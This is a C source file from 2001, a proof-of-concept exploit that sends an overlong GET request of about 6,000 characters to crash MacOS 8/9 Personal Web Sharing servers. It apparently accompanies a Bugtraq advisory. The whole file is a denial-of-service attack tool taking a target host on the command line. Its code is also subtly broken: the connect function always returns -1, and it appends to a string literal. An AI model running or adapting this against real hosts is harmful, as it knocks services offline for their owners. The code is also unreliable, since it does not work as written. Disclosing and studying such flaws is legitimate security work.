/*
 * MacOS 9 Personal Web Sharing Remote DoS Vulnerability exploit for LiNUX
 * Tahum - Tahum@acmemail.net - 17/5/2001
 *
 * This code is the proof of concept of the advisory at Bugtraq of Jass
 * Seljamaa.
 *
 * - Affected Systems: Apple MacOS 8.0
 *                     Apple MacOS 8.1
 *                     Apple MacOS 9.0
 *
 * Acknowledgements to BiT-QuaKe, innocent, eunice, bladi, and my dog,
 * guera :-*.
 *
 * Use this code at your own responsability.
 *
 * (C) 2001, HeliSec.
 *
 */

 #include <netdb.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <errno.h>


 int o_target (char *host,int port)
 {
   int sockah;
   struct sockaddr_in addr;
   struct hostent *he;

   if ((he=gethostbyname(host))==NULL)
   {
     fprintf(stderr, " ** Error , target doesn't exist.\n");
     return(-1);
   }

   if((sockah=socket(AF_INET, SOCK_STREAM, 6)) < 0)
   {
     fprintf(stderr, " ** Error making the socket.\n");
     return(-1);
   }

   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);

   if(connect(sockah,(struct sockaddr *)&addr, sizeof(addr))==-1)
   {
     fprintf(stderr, " ** Error in the connection.\n");
     return(-1);
   }
   sockah=-1;

   return sockah;
 }


 main(int argc, char **argv)
 {
   int sockah, i;
   char *request="GET http://";

   if (argc<2) {
     fprintf(stderr, "\n ** MacOS 9 Personal Web Sharing Remote DoS Vulnerability exploit for LiNUX **");
     fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 17/5/2001");
     fprintf(stderr, "\n (C) 2001, HeliSec.");
     fprintf(stderr, "\n Usage: %s host\n", argv[0]);
     return(-1);
   }

   fprintf(stderr, "\n ** MacOS 9 Personal Web Sharing Remote DoS Vulnerability exploit for LiNUX **");
   fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 17/5/2001");
   fprintf(stderr, "\n Trying connect to %s...", argv[1]);

   if((sockah=o_target(argv[1],80))==-1) {
     printf(" ** Error: we can't connect.\n");
     return(-1);
   }

   strcat(request,argv[1]);
   strcat(request,"/");

   fprintf(stderr, " [Connected]\n");
   fprintf(stderr, " Making the DoS...\n");

   for(i=0;i-strlen(request)<6099;i++) strcat(request,"T");
   strcat(request,".htm");

   send(sockah, request, strlen(request), 0);

   fprintf(stderr, " All done... DoS complete.\n");
   close(sockah);
 }